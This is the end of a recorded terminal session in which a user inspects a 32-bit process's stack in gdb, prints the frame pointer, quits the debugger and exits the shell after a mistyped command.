0xbffff6a0:	0xb7fcdac0	0x00000004	0xbffff6d8	0x0804898a
0xbffff6b0:	0x000002e2	0x0000000d	0xbffff8c8	0xbffff8bf
0xbffff6c0:	0xb7fcd3c4	0xb7fff000	0x0000000d	0x000002e2
0xbffff6d0:	0x080489a0	0xb7fcd000	0x00000000	0xb7e39af3
0xbffff6e0:	0x00000004	0xbffff774	0xbffff788	0xb7fece6a
0xbffff6f0:	0x00000004	0xbffff774	0xbffff714	0x0804a030
0xbffff700:	0x080482f8	0xb7fcd000	0x00000000	0x00000000
0xbffff710:	0x00000000	0x86c03fc2	0xbe189bd2	0x00000000
0xbffff720:	0x00000000	0x00000000	0x00000004	0x08048590
0xbffff730:	0x00000000	0xb7ff2660	0xb7e39a09	0xb7fff000
0xbffff740:	0x00000004	0x08048590	0x00000000	0x080485b1
0xbffff750:	0x0804882f	0x00000004	0xbffff774	0x080489a0
0xbffff760:	0x08048a10	0xb7fed300	0xbffff76c	0x0000001c
0xbffff770:	0x00000004	0xbffff8ab	0xbffff8ba	0xbffff8bf
0xbffff780:	0xbffff8c8	0x00000000	0xbffff8d1	0xbffff8e2
0xbffff790:	0xbffff8f6	0xbffff906	0xbffff928	0xbffff93b
(gdb) p $ebp
$1 = (void *) 0xbffff6a8
(gdb) q
A debugging session is active.

	Inferior 1 [process 11987] will be killed.

Quit anyway? (y or n) y
]0;mark@wreckme: ~mark@wreckme:~$ eexit
eexit: command not found
]0;mark@wreckme: ~mark@wreckme:~$ exit
exit

Script done on Thu 24 Oct 2019 04:14:54 AM EDT
